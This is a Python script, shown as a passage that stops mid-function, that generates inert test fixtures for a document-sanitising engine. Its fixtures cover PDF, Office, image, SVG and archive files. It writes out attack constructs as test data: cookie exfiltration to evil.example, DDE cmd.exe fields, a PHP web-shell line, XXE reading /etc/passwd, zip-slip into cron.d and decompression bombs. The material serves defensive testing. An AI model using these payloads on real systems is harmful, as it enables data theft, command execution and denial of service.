"""Generates the SafeForge test corpus: *inert* fixtures that carry the structural markers of real
attacks (JS actions, macro parts, DDE fields, EXIF GPS, ...). Payloads are harmless placeholder text
(e.g. app.alert(1), 'MZ' + filler); nothing here can execute. Run:  python corpus/make_corpus.py out_dir
"""
import io
import os
import shutil
import struct
import subprocess
import sys
import tempfile
import zipfile
import zlib
from dataclasses import dataclass

import pikepdf
from pikepdf import Array, Dictionary, Name, String


@dataclass
class Fixture:
    name: str
    filename: str
    data: bytes
    category: str
    status: str = "completed"                 # expected engine status in balanced mode
    threats: tuple = ()                       # threat types that MUST be reported
    must_not_contain: tuple = ()              # byte strings that must be gone from the output
    must_contain: tuple = ()                  # strings that must survive (business content)
    mode: str = "balanced"


# ============================================================ PDF
def _text_pdf(text="Invoice total: $100.00", author=None):
    from reportlab.pdfgen import canvas
    b = io.BytesIO()
    c = canvas.Canvas(b, pagesize=(300, 300), invariant=1)
    c.setFont("Helvetica", 14)
    c.drawString(30, 250, text)
    c.rect(20, 20, 260, 60)
    c.save()
    return b.getvalue()


def _open(data=None):
    return pikepdf.open(io.BytesIO(data or _text_pdf()))


def _save(pdf):
    b = io.BytesIO()
    pdf.save(b, object_stream_mode=pikepdf.ObjectStreamMode.disable)
    return b.getvalue()


def _js(code):
    return Dictionary(S=Name.JavaScript, JS=String(code))


def _annot(pdf, **kw):
    a = pdf.make_indirect(Dictionary(Type=Name.Annot, Rect=Array([20, 20, 100, 40]), **kw))
    page = pdf.pages[0].obj
    page.Annots = page.get("/Annots", Array())
    page.Annots.append(a)
    return a


def pdf_fixtures():
    out = []

    def add(name, pdf_or_bytes, threats, bad=(), **kw):
        data = pdf_or_bytes if isinstance(pdf_or_bytes, bytes) else _save(pdf_or_bytes)
        out.append(Fixture(name, name + ".pdf", data, "pdf", threats=tuple(threats), must_not_contain=tuple(bad),
                           must_contain=("Invoice total",), **kw))

    p = _open()
    p.Root.OpenAction = _js("app.launchURL('http://evil.example/?c='+document.cookie)")
    add("pdf_openaction_js", p, ["JavaScript"], [b"evil.example"])

    p = _open()
    p.Root.Names = Dictionary(JavaScript=Dictionary(Names=Array([String("x"), p.make_indirect(_js("app.alert(1)"))])))
    add("pdf_names_js", p, ["JavaScript"], [b"app.alert"])

    p = _open()
    p.pages[0].obj.AA = Dictionary(O=_js("app.alert('page open')"))
    add("pdf_page_aa_js", p, ["JavaScript", "AdditionalActions"], [b"page open"])

    p = _open()
    _annot(p, Subtype=Name.Link, A=Dictionary(S=Name.Launch, F=String("cmd.exe")))
    add("pdf_launch_action", p, ["Launch"], [b"cmd.exe"])

    p = _open()
    p.attachments["malware.exe"] = pikepdf.AttachedFileSpec(p, b"MZ" + b"\x90" * 200 + b"EVILPAYLOAD", mime_type="application/x-msdownload")
    add("pdf_embedded_exe", p, ["EmbeddedFile"], [b"EVILPAYLOAD", b"malware.exe"])

    p = _open()
    spec = pikepdf.AttachedFileSpec(p, b"ATTACHEDSECRET", mime_type="text/plain").obj
    _annot(p, Subtype=Name.FileAttachment, FS=spec, Name=Name.PushPin)
    add("pdf_fileattachment_annot", p, ["EmbeddedFile"], [b"ATTACHEDSECRET"])

    p = _open()
    xfa = p.make_stream(b"<xdp:xdp xmlns:xdp='http://ns.adobe.com/xdp/'><script>xfa.host.messageBox('x')</script></xdp:xdp>")
    p.Root.AcroForm = Dictionary(Fields=Array([]), XFA=Array([String("template"), xfa]))
    add("pdf_xfa_form", p, ["XFA"], [b"messageBox"])

    p = _open()
    ap = p.make_stream(b"BT /Helv 12 Tf 2 4 Td (FILLED-VALUE) Tj ET")
    ap.Type, ap.Subtype, ap.BBox = Name.XObject, Name.Form, Array([0, 0, 80, 20])
    ap.Resources = Dictionary(Font=Dictionary(Helv=Dictionary(Type=Name.Font, Subtype=Name.Type1, BaseFont=Name.Helvetica)))
    w = _annot(p, Subtype=Name.Widget, FT=Name.Tx, T=String("f1"), V=String("FILLED-VALUE"), AP=Dictionary(N=ap),
               AA=Dictionary(K=_js("app.alert('keystroke')")))
    p.Root.AcroForm = Dictionary(Fields=Array([w]))
    add("pdf_widget_with_js", p, ["JavaScript"], [b"keystroke", b"AcroForm"])

    p = _open()
    _annot(p, Subtype=Name.Link, A=Dictionary(S=Name.URI, URI=String("javascript:alert(document.cookie)")))
    add("pdf_uri_javascript", p, ["DangerousURI"], [b"javascript:"])

    p = _open()
    _annot(p, Subtype=Name.Link, A=Dictionary(S=Name.GoToR, F=String("\\\\attacker.example\\share\\x.pdf"), D=Array([0, Name.Fit])))
    add("pdf_gotor", p, ["ExternalAction"], [b"attacker.example"])

    p = _open()
    _annot(p, Subtype=Name.Link, A=Dictionary(S=Name.SubmitForm, F=Dictionary(FS=Name.URL, F=String("http://collector.example/p"))))
    add("pdf_submitform", p, ["ExternalAction"], [b"collector.example"])

    p = _open()
    _annot(p, Subtype=Name.RichMedia, RichMediaContent=Dictionary(Assets=Dictionary()))
    add("pdf_richmedia", p, ["ActiveMedia"], [b"RichMedia"])

    p = _open()
    p.docinfo["/Author"] = "CEO John Doe"
    p.docinfo["/Creator"] = "Secret Tool 9"
    p.docinfo["/Producer"] = "InternalProducer"
    p.Root.Metadata = p.make_stream(b"<x:xmpmeta xmlns:x='adobe:ns:meta/'><rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'><rdf:Description xmlns:dc='http://purl.org/dc/elements/1.1/'><dc:creator><rdf:Seq><rdf:li>CEO XMPNAME</rdf:li></rdf:Seq></dc:creator></rdf:Description></rdf:RDF></x:xmpmeta>")
    p.Root.Metadata.Type, p.Root.Metadata.Subtype = Name.Metadata, Name.XML
    add("pdf_metadata", p, ["Metadata"], [b"CEO John Doe", b"XMPNAME", b"InternalProducer"])

    # hidden layer + invisible text, built from scratch
    p = pikepdf.new()
    font = p.make_indirect(Dictionary(Type=Name.Font, Subtype=Name.Type1, BaseFont=Name.Helvetica))
    ocg = p.make_indirect(Dictionary(Type=Name.OCG, Name=String("Draft")))
    content = (b"BT /F1 14 Tf 30 250 Td (Invoice total: $100.00) Tj ET\n"
               b"/OC /MC0 BDC BT /F1 14 Tf 30 200 Td (SECRET-LAYER-TEXT) Tj ET EMC\n"
               b"q BT 3 Tr /F1 14 Tf 30 150 Td (INVISIBLE-RUN) Tj ET Q\n")
    page = p.make_indirect(Dictionary(Type=Name.Page, MediaBox=Array([0, 0, 300, 300]),
                                      Resources=Dictionary(Font=Dictionary(F1=font), Properties=Dictionary(MC0=ocg)),
                                      Contents=p.make_stream(content)))
    p.pages.append(pikepdf.Page(page))
    p.Root.OCProperties = Dictionary(OCGs=Array([ocg]), D=Dictionary(OFF=Array([ocg]), Order=Array([ocg])))
    add("pdf_hidden_layer_and_text", p, ["HiddenLayer", "HiddenText"], [b"SECRET-LAYER-TEXT", b"INVISIBLE-RUN"])

    # real incremental update (old revision keeps data a rebuild must drop)
    base = _save(_open())
    sx = int(base.rsplit(b"startxref", 1)[1].split()[0])
    pdf = pikepdf.open(io.BytesIO(base))
    size = int(pdf.trailer.Size)
    root_ref = pdf.trailer.Root.objgen[0]
    off = len(base)
    obj = b"\n%d 0 obj\n<< /Author (OLD-REVISION-SECRET) >>\nendobj\n" % size
    xref_off = off + len(obj)
    xref = b"xref\n%d 1\n%010d 00000 n \n" % (size, off + 1)
    trailer = b"trailer\n<< /Size %d /Root %d 0 R /Info %d 0 R /Prev %d >>\nstartxref\n%d\n%%%%EOF\n" % (size + 1, root_ref, size, sx, xref_off)
    inc = base + obj + xref + trailer
    pikepdf.open(io.BytesIO(inc))  # must still be valid
    add("pdf_incremental_update", inc, ["HiddenData", "Metadata"], [b"OLD-REVISION-SECRET"])

    p = _open()
    pg = p.pages[0].obj
    mb = pg.MediaBox
    del pg["/MediaBox"]
    p.Root.Pages.MediaBox = mb
    add("pdf_inherited_mediabox", p, [])

    p = _open()
    stream = p.make_stream(b"\x00" * 16)
    stream.Type, stream.Subtype, stream.Width, stream.Height = Name.XObject, Name.Image, 4, 4
    stream.ColorSpace, stream.BitsPerComponent, stream.Filter = Name.DeviceGray, 8, Name.JBIG2Decode
    p.pages[0].obj.Resources.XObject = Dictionary(Im0=stream)
    add("pdf_jbig2_stream", p, ["DecoderRisk"])
    return out


# ============================================================ OOXML helpers
def zread(b):
    z = zipfile.ZipFile(io.BytesIO(b))
    return {n: z.read(n) for n in z.namelist()}


def zwrite(parts):
    o = io.BytesIO()
    with zipfile.ZipFile(o, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in parts.items():
            z.writestr(n, d)
    return o.getvalue()


def add_rel(parts, relpath, rid, typ, target, external=False):
    base = (b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>')
    x = parts.get(relpath, base).decode()
    rel = '<Relationship Id="%s" Type="%s" Target="%s"%s/>' % (rid, typ, target, ' TargetMode="External"' if external else "")
    parts[relpath] = x.replace("</Relationships>", rel + "</Relationships>").encode()


def add_override(parts, part, ctype):
    x = parts["[Content_Types].xml"].decode()
    parts["[Content_Types].xml"] = x.replace("</Types>", '<Override PartName="%s" ContentType="%s"/></Types>' % (part, ctype)).encode()


def sub(parts, name, old, new):
    s = parts[name].decode()
    assert old in s, (name, old)
    parts[name] = s.replace(old, new, 1).encode()


RT = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
W_NS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
R_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"


def _docx_base():
    import docx
    d = docx.Document()
    d.core_properties.author = "John Doe"
    d.core_properties.last_modified_by = "Jane Roe"
    d.core_properties.comments = "internal draft"
    d.add_paragraph("Quarterly report: revenue grew 12%.")
    b = io.BytesIO()
    d.save(b)
    return zread(b.getvalue())


def _body(parts, xml):
    sub(parts, "word/document.xml", "<w:sectPr", xml + "<w:sectPr")


def docx_fixtures():
    out = []

    def add(name, parts, threats, bad=(), ext="docx", **kw):
        data = parts if isinstance(parts, bytes) else zwrite(parts)
        out.append(Fixture(name, f"{name}.{ext}", data, "office", threats=tuple(threats), must_not_contain=tuple(bad),
                           must_contain=kw.pop("must_contain", ("Quarterly report",)), **kw))

    p = _docx_base()
    p["word/vbaProject.bin"] = b"FAKE-VBA-PROJECT-AutoOpen"
    add_rel(p, "word/_rels/document.xml.rels", "rIdVba", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin")
    add_override(p, "/word/vbaProject.bin", "application/vnd.ms-office.vbaProject")
    sub(p, "[Content_Types].xml", "wordprocessingml.document.main+xml", "..PLACEHOLDER..") if False else None
    ct = p["[Content_Types].xml"].decode().replace("application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml", "application/vnd.ms-word.document.macroEnabled.main+xml")
    p["[Content_Types].xml"] = ct.encode()
    add("docm_macro", p, ["Macro"], [b"vbaProject", b"AutoOpen"], ext="docm")

    p = _docx_base()
    _body(p, '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>cached</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
                '<w:p><w:fldSimple w:instr=" DDE &quot;cmd&quot; &quot;/c calc&quot; "><w:r><w:t>simple</w:t></w:r></w:fldSimple></w:p>')
    add("docx_dde_fields", p, ["DDE/Field"], [b"DDEAUTO", b"calc.exe", b"cmd.exe"])

    p = _docx_base()
    sub(p, "word/settings.xml", "</w:settings>", '<w:attachedTemplate r:id="rIdTpl"/></w:settings>')
    add_rel(p, "word/_rels/settings.xml.rels", "rIdTpl", RT + "attachedTemplate", "http://evil.example/t.dotm", external=True)
    add("docx_template_injection", p, ["TemplateInjection"], [b"evil.example", b"attachedTemplate"])

    p = _docx_base()
    _body(p, '<w:p><w:r><w:t>VISIBLE-PARA</w:t></w:r><w:r><w:rPr><w:vanish/></w:rPr><w:t>HIDDEN-VANISH-TEXT</w:t></w:r></w:p>'
             '<w:p><w:ins w:id="1" w:author="Mallory" w:date="2020-01-01T00:00:00Z"><w:r><w:t>INSERTED-KEPT</w:t></w:r></w:ins>'
             '<w:del w:id="2" w:author="Mallory" w:date="2020-01-01T00:00:00Z"><w:r><w:delText>DELETED-SECRET-DATA</w:delText></w:r></w:del></w:p>'
             '<w:p><w:commentRangeStart w:id="0"/><w:r><w:t>COMMENTED</w:t></w:r><w:commentRangeEnd w:id="0"/><w:r><w:commentReference w:id="0"/></w:r></w:p>')
    p["word/comments.xml"] = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:comments xmlns:w="%s"><w:comment w:id="0" w:author="Mallory"><w:p><w:r><w:t>COMMENT-SECRET-TEXT</w:t></w:r></w:p></w:comment></w:comments>' % W_NS).encode()
    add_rel(p, "word/_rels/document.xml.rels", "rIdCom", RT + "comments", "comments.xml")
    add_override(p, "/word/comments.xml", "application/vnd.openxmlformats-officedocument.wordprocessingml.comments+xml")
    add("docx_hidden_text_trackchanges_comments", p, ["HiddenText", "TrackedChanges", "Comment"],
        [b"HIDDEN-VANISH-TEXT", b"DELETED-SECRET-DATA", b"COMMENT-SECRET-TEXT"],
        must_contain=("VISIBLE-PARA", "INSERTED-KEPT", "COMMENTED"))

    p = _docx_base()
    p["word/activeX/activeX1.xml"] = b'<ocx xmlns="http://schemas.microsoft.com/office/2006/activeX"/>'
    p["word/activeX/activeX1.bin"] = b"ACTIVEX-BINARY"
    add_rel(p, "word/_rels/document.xml.rels", "rIdAx", RT + "control", "activeX/activeX1.xml")
    p["word/embeddings/oleObject1.bin"] = b"OLE-EMBEDDED-PAYLOAD"
    add_rel(p, "word/_rels/document.xml.rels", "rIdOle", RT + "oleObject", "embeddings/oleObject1.bin")
    add("docx_activex_ole", p, ["ActiveX", "EmbeddedObject"], [b"ACTIVEX-BINARY", b"OLE-EMBEDDED-PAYLOAD"])

    p = _docx_base()
    add_rel(p, "word/_rels/document.xml.rels", "rIdH1", RT + "hyperlink", "https://example.com/ok", external=True)
    add_rel(p, "word/_rels/document.xml.rels", "rIdH2", RT + "hyperlink", "file:///\\\\attacker\\share\\x", external=True)
    add_rel(p, "word/_rels/document.xml.rels", "rIdH3", RT + "hyperlink", "javascript:alert(1)", external=True)
    _body(p, '<w:p><w:hyperlink r:id="rIdH1"><w:r><w:t>GOODLINK</w:t></w:r></w:hyperlink> <w:hyperlink r:id="rIdH2"><w:r><w:t>UNCLINK-TEXT</w:t></w:r></w:hyperlink> <w:hyperlink r:id="rIdH3"><w:r><w:t>JSLINK-TEXT</w:t></w:r></w:hyperlink></w:p>')
    add("docx_dangerous_hyperlinks", p, ["DangerousLink"], [b"attacker", b"javascript:"],
        must_contain=("GOODLINK", "UNCLINK-TEXT", "JSLINK-TEXT"))

    p = _docx_base()
    add_rel(p, "word/_rels/document.xml.rels", "rIdImg", RT + "image", "http://tracker.example/pixel.png", external=True)
    _body(p, '<w:p><w:r><w:pict xmlns:v="urn:schemas-microsoft-com:vml"><v:shape style="width:1pt;height:1pt"><v:imagedata r:id="rIdImg"/></v:shape></w:pict></w:r></w:p>')
    add("docx_external_image_tracker", p, ["ExternalResource"], [b"tracker.example"])

    p = _docx_base()
    p["word/document.xml"] = (b'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><w:document xmlns:w="%s"><w:body><w:p><w:r><w:t>&lol2;</w:t></w:r></w:p></w:body></w:document>' % W_NS.encode())
    out.append(Fixture("docx_xml_bomb", "docx_xml_bomb.docx", zwrite(p), "bomb", status="blocked"))

    p = _docx_base()
    o = io.BytesIO()
    with zipfile.ZipFile(o, "w") as z:
        for n, d in p.items():
            z.writestr(n, d)
        z.writestr(zipfile.ZipInfo("../../evil.txt"), b"zip-slip")
    add("docx_zip_slip_entry", o.getvalue(), ["PathTraversal"], [b"zip-slip"])

    p = _docx_base()
    o = io.BytesIO()
    import warnings
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        with zipfile.ZipFile(o, "w") as z:
            for n, d in p.items():
                z.writestr(n, d)
            z.writestr("word/document.xml", p["word/document.xml"].replace(b"Quarterly", b"Forged"))
    out.append(Fixture("docx_duplicate_entries", "docx_duplicate_entries.docx", o.getvalue(), "bomb", status="failed"))
    return out


def xlsx_fixtures():
    import openpyxl
    out = []

    def base():
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = "Public"
        ws["A1"], ws["B1"], ws["C1"] = "Region", "Sales", "HIDDENCOL"
        ws["A2"], ws["B2"], ws["C2"] = "North", 100, "colsecret"
        ws["A3"], ws["B3"] = "ROWSECRET", 5
        ws.row_dimensions[3].hidden = True
        ws.column_dimensions["C"].hidden = True
        sec = wb.create_sheet("Secret")
        sec["A1"] = "TOP-SECRET-SHEET-DATA"
        sec.sheet_state = "veryHidden"
        wb.properties.creator = "Alice Analyst"
        wb.properties.lastModifiedBy = "Bob"
        b = io.BytesIO()
        wb.save(b)
        return zread(b.getvalue())

    def add(name, parts, threats, bad=(), ext="xlsx", **kw):
        out.append(Fixture(name, f"{name}.{ext}", zwrite(parts), "office", threats=tuple(threats), must_not_contain=tuple(bad),
                           must_contain=kw.pop("must_contain", ("Region", "North")), **kw))

    p = base()
    add("xlsx_hidden_sheet_rows_cols", p, ["HiddenSheet", "HiddenData"], [b"TOP-SECRET-SHEET-DATA", b"ROWSECRET", b"colsecret"])

    p = base()
    p["xl/externalLinks/externalLink1.xml"] = b'<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>'
    add_rel(p, "xl/externalLinks/_rels/externalLink1.xml.rels", "rId1", RT + "externalLinkPath", "file:///C:/secret/book.xlsx", external=True)
    add_rel(p, "xl/_rels/workbook.xml.rels", "rIdExt", RT + "externalLink", "externalLinks/externalLink1.xml")
    sub(p, "xl/workbook.xml", "</sheets>", '</sheets><externalReferences><externalReference xmlns:r="%s" r:id="rIdExt"/></externalReferences>' % R_NS)
    add_override(p, "/xl/externalLinks/externalLink1.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml")
    add("xlsx_external_link", p, ["ExternalLink"], [b"C:/secret", b"externalLink"])

    p = base()
    sub(p, "xl/worksheets/sheet1.xml", "<f>", "<f>") if False else None
    s = p["xl/worksheets/sheet1.xml"].decode()
    s = s.replace("</sheetData>", '<row r="9"><c r="A9"><f>WEBSERVICE("http://evil.example/?d="&amp;A1)</f><v>cached</v></c><c r="B9"><f>cmd|\' /C calc\'!A0</f><v>0</v></c></row></sheetData>')
    p["xl/worksheets/sheet1.xml"] = s.encode()
    add("xlsx_formula_injection", p, ["FormulaInjection"], [b"WEBSERVICE", b"evil.example", b"/C calc"])

    p = base()
    p["xl/vbaProject.bin"] = b"FAKE-XL-VBA"
    add_rel(p, "xl/_rels/workbook.xml.rels", "rIdVba", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin")
    p["xl/macrosheets/sheet1.xml"] = b'<xm:macrosheet xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><xm:sheetData/></xm:macrosheet>'
    add_rel(p, "xl/_rels/workbook.xml.rels", "rIdXlm", RT + "macrosheet", "macrosheets/sheet1.xml")
    p["[Content_Types].xml"] = p["[Content_Types].xml"].replace(b"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml", b"application/vnd.ms-excel.sheet.macroEnabled.main+xml")
    add("xlsm_vba_and_xlm", p, ["Macro", "XLMMacro"], [b"FAKE-XL-VBA", b"macrosheet"], ext="xlsm")
    return out


def pptx_fixtures():
    from pptx import Presentation
    out = []
    prs = Presentation()
    s1 = prs.slides.add_slide(prs.slide_layouts[1])
    s1.shapes.title.text = "Public roadmap"
    s1.placeholders[1].text = "Launch in Q3"
    s1.notes_slide.notes_text_frame.text = "NOTES-PASSWORD-hunter2"
    s2 = prs.slides.add_slide(prs.slide_layouts[1])
    s2.shapes.title.text = "HIDDEN-SLIDE-SECRET"
    s2._element.set("show", "0")
    prs.core_properties.author = "Presenter Pat"
    b = io.BytesIO()
    prs.save(b)
    p = zread(b.getvalue())
    p["ppt/embeddings/oleObject1.bin"] = b"PPT-OLE-PAYLOAD"
    add_rel(p, "ppt/slides/_rels/slide1.xml.rels", "rIdOle", RT + "oleObject", "../embeddings/oleObject1.bin")
    add_rel(p, "ppt/slides/_rels/slide1.xml.rels", "rIdLnk", RT + "hyperlink", "file:///C:/Windows/System32/calc.exe", external=True)
    out.append(Fixture("pptx_notes_hidden_slide_ole", "pptx_notes_hidden_slide_ole.pptx", zwrite(p), "office",
                       threats=("SpeakerNotes", "HiddenSlide", "EmbeddedObject", "DangerousLink"),
                       must_not_contain=(b"NOTES-PASSWORD", b"HIDDEN-SLIDE-SECRET", b"PPT-OLE-PAYLOAD", b"calc.exe"),
                       must_contain=("Public roadmap", "Launch in Q3")))
    return out


# ============================================================ images / svg / text
def _png_chunk(t, d):
    return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)


def pixel_bomb_png(w=40000, h=40000):
    raw_row = b"\x00" * (1 + (w + 7) // 8)
    comp = zlib.compressobj(9)
    chunks = [comp.compress(raw_row) for _ in range(1)]
    body = b""
    # stream the same row h times without holding it all in memory
    parts = []
    for _ in range(h):
        parts.append(comp.compress(raw_row))
    parts.append(comp.flush())
    idat = b"".join(parts)
    return (b"\x89PNG\r\n\x1a\n" + _png_chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 1, 0, 0, 0, 0))
            + _png_chunk(b"IDAT", idat) + _png_chunk(b"IEND", b""))


def image_fixtures():
    from PIL import Image
    from PIL.PngImagePlugin import PngInfo
    out = []

    def photo(size=(64, 48)):
        im = Image.new("RGB", size)
        px = im.load()
        for x in range(size[0]):
            for y in range(size[1]):
                px[x, y] = (x * 4 % 256, y * 5 % 256, (x + y) * 3 % 256)
        return im

    ex = Image.Exif()
    ex[0x010F], ex[0x0110], ex[0x0131], ex[0x013B] = "Canon", "EOS-1D", "PhotoApp 2.0", "Whistle Blower"
    ex[0x8825] = {1: "N", 2: (19.0, 4.0, 33.6), 3: "E", 4: (72.0, 52.0, 39.7)}
    b = io.BytesIO()
    photo().save(b, "JPEG", exif=ex, quality=92)
    out.append(Fixture("jpg_with_gps_exif", "photo.jpg", b.getvalue(), "image", threats=("GPS", "Metadata"),
                       must_not_contain=(b"Canon", b"EOS-1D", b"Exif")))
    out.append(Fixture("jpg_with_trailing_payload", "photo2.jpg", b.getvalue() + b"<?php system($_GET['c']); ?>TRAILING-PAYLOAD", "image",
                       threats=("TrailingData",), must_not_contain=(b"TRAILING-PAYLOAD", b"<?php")))

    pi = PngInfo()
    pi.add_text("Author", "Secret Author")
    pi.add_text("Comment", "GPS 19.07,72.87")
    b = io.BytesIO()
    photo().save(b, "PNG", pnginfo=pi)
    out.append(Fixture("png_text_chunks_and_trailer", "logo.png", b.getvalue() + b"MZ-APPENDED-EXE", "image",
                       threats=("Metadata", "TrailingData"), must_not_contain=(b"Secret Author", b"MZ-APPENDED-EXE", b"tEXt")))

    frames = [Image.new("RGB", (20, 20), c) for c in ((255, 0, 0), (0, 255, 0), (0, 0, 255))]
    b = io.BytesIO()
    frames[0].save(b, "GIF", save_all=True, append_images=frames[1:], duration=80, loop=0, comment=b"GIF-SECRET-COMMENT")
    out.append(Fixture("gif_animated_comment", "anim.gif", b.getvalue(), "image", threats=("Metadata",), must_not_contain=(b"GIF-SECRET-COMMENT",)))

    b = io.BytesIO()
    photo().save(b, "WEBP", exif=ex.tobytes(), quality=90)
    out.append(Fixture("webp_with_exif", "pic.webp", b.getvalue(), "image", threats=("Metadata",), must_not_contain=(b"Canon",)))
    b = io.BytesIO()
    photo().save(b, "BMP")
    out.append(Fixture("bmp_plain", "pic.bmp", b.getvalue(), "image"))
    b = io.BytesIO()
    photo().save(b, "TIFF")
    out.append(Fixture("tiff_plain", "pic.tiff", b.getvalue(), "image"))

    out.append(Fixture("png_pixel_bomb", "bomb.png", pixel_bomb_png(), "bomb", status="blocked", threats=("Bomb",)))
    out.append(Fixture("jpg_wrong_extension_html", "evil.jpg", b"<html><script>alert(1)</script></html>", "spoof", threats=("TypeSpoofing",), status="completed", mode="balanced"))
    return out


SVG_HEAD = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" viewBox="0 0 100 100">'
SVG_PAYLOADS = {
    "svg_script_tag": ('<script>alert(document.cookie)</script><rect width="50" height="50" fill="red"/>', ["ActiveContent"], [b"<script", b"document.cookie"]),
    "svg_onload_attr": ('<rect width="50" height="50" fill="red" onload="alert(1)"/>', ["EventHandler"], [b"onload"]),
    "svg_root_onload": (None, ["EventHandler"], [b"onload"]),
    "svg_foreignobject": ('<foreignObject width="50" height="50"><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"/></foreignObject><rect width="10" height="10"/>', ["ActiveContent"], [b"foreignObject", b"iframe"]),
    "svg_javascript_href": ('<a xlink:href="javascript:alert(1)"><rect width="50" height="50"/></a>', ["ActiveContent"], [b"javascript:"]),
    "svg_animate_set": ('<rect width="10" height="10"><set attributeName="onmouseover" to="alert(1)"/><animate attributeName="href" values="javascript:alert(1)"/></rect>', ["ActiveContent"], [b"<set", b"<animate"]),
    "svg_external_image": ('<image xlink:href="http://tracker.example/p.png" width="5" height="5"/><rect width="10" height="10"/>', ["ExternalReference"], [b"tracker.example"]),
    "svg_use_external": ('<use xlink:href="http://evil.example/x.svg#a"/><rect width="10" height="10"/>', ["ExternalReference"], [b"evil.example"]),
    "svg_css_import": ('<style>@import url(http://evil.example/x.css); rect{fill:red}</style><rect width="10" height="10"/>', ["ExternalReference"], [b"@import", b"evil.example"]),
    "svg_style_url": ('<rect width="10" height="10" style="fill:url(http://evil.example/g)"/>', ["ExternalReference"], [b"evil.example"]),
}


def svg_fixtures():
    out = []
    for name, (body, threats, bad) in SVG_PAYLOADS.items():
        if body is None:
            svg = SVG_HEAD.replace("<svg ", '<svg onload="alert(1)" ', 1) + '<rect width="50" height="50" fill="blue"/></svg>'
        else:
            svg = SVG_HEAD + body + "</svg>"
        out.append(Fixture(name, name + ".svg", svg.encode(), "svg", threats=tuple(threats), must_not_contain=tuple(bad)))
    bomb = ('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]>'
            '<svg xmlns="http://www.w3.org/2000/svg"><text>&c;</text></svg>')
    out.append(Fixture("svg_billion_laughs", "bomb.svg", bomb.encode(), "bomb", status="blocked", threats=("Bomb",)))
    xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>'
    out.append(Fixture("svg_xxe", "xxe.svg", xxe.encode(), "bomb", status="blocked", threats=("Bomb",)))
    return out


def misc_fixtures():
    out = []
    out.append(Fixture("exe_renamed_pdf", "resume.pdf", b"MZ\x90\x00" + b"\x00" * 200 + b"This program cannot be run in DOS mode", "spoof", status="blocked"))
    out.append(Fixture("elf_renamed_png", "pic.png", b"\x7fELF" + b"\x00" * 100, "spoof", status="blocked"))
    out.append(Fixture("docx_renamed_pdf", "report.pdf", docx_fixtures()[1].data, "spoof", threats=("TypeSpoofing", "DDE/Field")))
    out.append(Fixture("text_trojan_source", "code.txt", "access = \u202eadmin\u202c\u2066x\u2069 level\x07\n".encode(), "text", threats=("BidiControl",)))
    out.append(Fixture("rar_unsupported", "a.rar", b"Rar!\x1a\x07\x00" + b"\x00" * 50, "archive", status="blocked"))
    out.append(Fixture("empty_file", "empty.pdf", b"", "spoof", status="failed"))
    out.append(Fixture("garbage_pdf", "broken.pdf", b"%PDF-1.7\nthis is not a pdf at all", "pdf", status="failed"))
    return out


# ============================================================ archives / email
def zip_of(files):
    o = io.BytesIO()
    with zipfile.ZipFile(o, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in files.items():
            z.writestr(n, d)
    return o.getvalue()


def archive_fixtures():
    out = []
    pdfjs = pdf_fixtures()[0].data
    inner = zip_of({"deep/evil.pdf": pdfjs})
    out.append(Fixture("zip_mixed_content", "bundle.zip", zip_of({"docs/invoice.pdf": pdfjs, "tools/run.exe": b"MZ" + b"\x00" * 64, "readme.txt": b"hello", "nested.zip": inner}),
                       "archive", threats=("Member:JavaScript", "ArchiveEntryBlocked"), must_not_contain=(b"evil.example",)))
    o = io.BytesIO()
    with zipfile.ZipFile(o, "w") as z:
        z.writestr("ok.txt", b"fine")
        z.writestr(zipfile.ZipInfo("../../../etc/cron.d/x"), b"* * * * * root evil")
    out.append(Fixture("zip_slip", "slip.zip", o.getvalue(), "archive", threats=("PathTraversal",), must_not_contain=(b"cron.d", b"evil")))
    # decompression bomb: 150 MiB of zeros -> ~150 KiB
    o = io.BytesIO()
    with zipfile.ZipFile(o, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        with z.open("zeros.bin", "w", force_zip64=True) as f:
            chunk = b"\x00" * (1 << 20)
            for _ in range(150):
                f.write(chunk)
    out.append(Fixture("zip_bomb_ratio", "bomb.zip", o.getvalue(), "bomb", status="blocked", threats=("Bomb",)))
    # nested zips beyond the depth limit
    d = zip_of({"a.txt": b"x"})
    for _ in range(5):
        d = zip_of({"n.zip": d})
